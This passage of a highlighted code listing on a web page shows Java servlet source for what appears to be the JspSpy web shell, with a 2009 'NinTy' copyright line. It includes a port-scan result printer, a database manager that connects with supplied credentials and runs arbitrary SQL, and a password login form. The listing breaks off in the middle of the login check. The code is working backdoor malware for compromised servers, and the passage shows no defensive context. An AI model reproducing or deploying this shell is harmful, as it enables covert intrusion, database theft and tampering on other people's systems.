class="string">"Close"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span>&lt;Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;&gt; entrySet = rs.entrySet();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; e:entrySet) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> port = e.getKey();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> value = e.getValue();</span></span><br><span class="line"><span class="vbscript">out.println(ip+<span class="string">" : "</span>+port+<span class="string">" ................................. &lt;font color="</span>+(value.equals(<span class="string">"Open"</span>)?<span class="string">"green"</span>:<span class="string">"red"</span>)+<span class="string">"&gt;&lt;b&gt;"</span>+value+<span class="string">"&lt;/b&gt;&lt;/font&gt;&lt;br&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VConnInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj == <span class="literal">null</span> || !((DBOperator)obj).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"  &lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function changeurldriver()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>form1\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var v = form.elements[\"</span>db\<span class="string">"].value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>url\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[1];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>driver\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[0];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>selectDb\<span class="string">"].value = form.elements[\"</span>db\<span class="string">"].selectedIndex;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>selectDb\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;DataBase Manager &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input id=\"</span>action\<span class="string">" type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>dbc\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Driver:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>driver\<span class="string">" id=\"</span>driver\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">35</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" id=\"</span>url\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">90</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"UID:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>uid\<span class="string">" id=\"</span>uid\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"PWD:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>pwd\<span class="string">" id=\"</span>pwd\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"DataBase:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;select onchange='changeurldriver()' class=\"</span>input\<span class="string">" id=\"</span>db\<span class="string">" name=\"</span>db\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&amp;characterEncoding=GBK'&gt;Mysql&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'&gt;Oracle&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'&gt;Sql Server&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver=&#123;Microsoft Access Driver (*.mdb)&#125;;DBQ=C:\\ninty.mdb'&gt;Access&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value=' ` '&gt;Other&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>Connect\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/table&gt;&lt;script&gt;changeurldriver()&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//DBConnect</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DbcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> driver = <span class="built_in">request</span>.getParameter(<span class="string">"driver"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> url = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> uid = <span class="built_in">request</span>.getParameter(<span class="string">"uid"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> pwd = <span class="built_in">request</span>.getParameter(<span class="string">"pwd"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> sql = <span class="built_in">request</span>.getParameter(<span class="string">"sql"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> selectDb = <span class="built_in">request</span>.getParameter(<span class="string">"selectDb"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (selectDb == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">selectDb = JSession.getAttribute(<span class="string">"selectDb"</span>).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">else</span></span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"selectDb"</span>,selectDb);</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo == <span class="literal">null</span> || !((DBOperator)dbo).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).close();</span></span><br><span class="line"><span class="vbscript">dbo = <span class="keyword">new</span> DBOperator(driver,url,uid,pwd,<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(driver) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(url) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(uid)) &#123;</span></span><br><span class="line"><span class="vbscript">DBOperator oldDbo = (DBOperator)dbo;</span></span><br><span class="line"><span class="vbscript">dbo = <span class="keyword">new</span> DBOperator(driver,url,uid,pwd);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!oldDbo.equals(dbo)) &#123;</span></span><br><span class="line"><span class="vbscript">((DBOperator)oldDbo).close();</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).connect();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">dbo = oldDbo;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">DBOperator Ddbo = (DBOperator)dbo;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(DBO,Ddbo);</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,<span class="string">"Connect To DataBase Success!"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"  &lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function changeurldriver(selectDb)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>form1\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		if (selectDb)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			form.elements[\"</span>db\<span class="string">"].selectedIndex = selectDb"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var v = form.elements[\"</span>db\<span class="string">"].value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>url\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[1];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>driver\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[0];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>selectDb\<span class="string">"].value = form.elements[\"</span>db\<span class="string">"].selectedIndex;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>selectDb\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\""+selectDb+"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;DataBase Manager &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input id=\"</span>action\<span class="string">" type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>dbc\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Driver:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>driver\<span class="string">" value=\""+Ddbo.driver+"</span>\<span class="string">" id=\"</span>driver\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">35</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" value=\""+Ddbo.url+"</span>\<span class="string">" id=\"</span>url\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">90</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"UID:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>uid\<span class="string">" value=\""+Ddbo.uid+"</span>\<span class="string">" id=\"</span>uid\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"PWD:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>pwd\<span class="string">" value=\""+Ddbo.pwd+"</span>\<span class="string">" id=\"</span>pwd\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"DataBase:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;select onchange='changeurldriver()' class=\"</span>input\<span class="string">" id=\"</span>db\<span class="string">" name=\"</span>db\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&amp;characterEncoding=GBK'&gt;Mysql&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'&gt;Oracle&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'&gt;Sql Server&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver=&#123;Microsoft Access Driver (*.mdb)&#125;;DBQ=C:/ninty.mdb'&gt;Access&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value=' ` '&gt;Other&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>Connect\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;script&gt;changeurldriver('"</span>+selectDb+<span class="string">"')&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>POST\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\""+selectDb+"</span>\<span class="string">"&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>executesql\<span class="string">"&gt;&lt;table width=\"</span><span class="number">200</span>\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td colspan=\"</span><span class="number">2</span>\<span class="string">"&gt;Run SQL query/queries on database :&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name=\"</span>sql\<span class="string">" class=\"</span>area\<span class="string">" style=\"</span>width:<span class="number">600</span>px;height:<span class="number">50</span>px;overflow:auto;\<span class="string">"&gt;"</span>+Util.htmlEncode(Util.getStr(sql))+<span class="string">"&lt;/textarea&gt;&lt;/td&gt;&lt;td style=\"</span>padding:<span class="number">0</span> <span class="number">5</span>px;\<span class="string">"&gt;&lt;input class=\"</span>bt\<span class="string">" style=\"</span>height:<span class="number">50</span>px;\<span class="string">" name=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Query\<span class="string">" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;&lt;/form&gt;&lt;/table&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">//e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ExecuteSQLInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> sql = <span class="built_in">request</span>.getParameter(<span class="string">"sql"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> db = <span class="built_in">request</span>.getParameter(<span class="string">"selectDb"</span>);</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(sql)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo == <span class="literal">null</span> || !((DBOperator)dbo).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vConn"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">Object obj = ((DBOperator)dbo).<span class="keyword">execute</span>(sql);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj instanceof ResultSet) &#123;</span></span><br><span class="line"><span class="vbscript">ResultSet rs = (ResultSet)obj;</span></span><br><span class="line"><span class="vbscript">ResultSetMetaData meta = rs.getMetaData();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> colCount = meta.getColumnCount();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='padding:10px'&gt;&lt;p&gt;&lt;b&gt;Query#0 : "</span>+Util.htmlEncode(sql)+<span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">3</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr class=\"</span>head\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">1</span>;i&lt;=colCount;i++) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;td nowrap&gt;"</span>+meta.getColumnName(i)+<span class="string">"&lt;br&gt;&lt;span&gt;"</span>+meta.getColumnTypeName(i)+<span class="string">"&lt;/span&gt;&lt;/td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Table tb = <span class="keyword">new</span> Table();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(rs.<span class="keyword">next</span>()) &#123;</span></span><br><span class="line"><span class="vbscript">Row r = <span class="keyword">new</span> Row();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>;i&lt;=colCount;i++) &#123;</span></span><br><span class="line"><span class="vbscript">r.addColumn(<span class="keyword">new</span> Column(rs.getString(i)));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">tb.addRow(r);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(tb.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/table&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">rs.close();</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).closeStmt();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;&lt;h2&gt;affected rows : &lt;b&gt;"</span>+obj+<span class="string">"&lt;/b&gt;&lt;/h2&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VLoginInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;style type=\"</span>text/css\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	input &#123;font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a&#123;font:11px Verdana;BACKGROUND: #FFFFFF;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/style&gt;&lt;form method=\"</span>POST\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	  &lt;p&gt;&lt;span style=\"</span>font:<span class="number">11</span>px Verdana;\<span class="string">"&gt;Password: &lt;/span&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input name=\"</span>o\<span class="string">" type=\"</span>hidden\<span class="string">" value=\"</span>login\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input name=\"</span>pw\<span class="string">" type=\"</span>password\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>login\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input type=\"</span>submit\<span class="string">" value=\"</span>Login\<span class="string">"&gt;&lt;br/&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	  "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;span style=\"</span>font:<span class="number">11</span>px Verdana;\<span class="string">"&gt;Copyright &amp;copy; 2009 NinTy &lt;/span&gt;&lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;www.Forjj.com&lt;/a&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> LoginInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> inputPw = <span class="built_in">request</span>.getParameter(<span class="string">"pw"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(inputPw) || !inputPw.equals(PW)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span 